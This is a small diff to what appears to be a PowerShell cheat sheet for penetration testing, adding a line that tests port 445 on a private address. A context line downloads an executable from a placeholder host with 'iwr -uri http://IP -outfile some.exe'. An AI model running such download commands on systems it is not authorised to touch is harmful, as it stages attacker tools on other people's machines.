@@ -48,7 +48,8 @@ Get-ChildItem . -Force
 # download stuff if needed
 iwr -uri http://IP -outfile some.exe
 
-
+# test locally connections
+Test-NetConnection -Port 445 192.168.50.111
 ```
 
 ### Helpful stuff
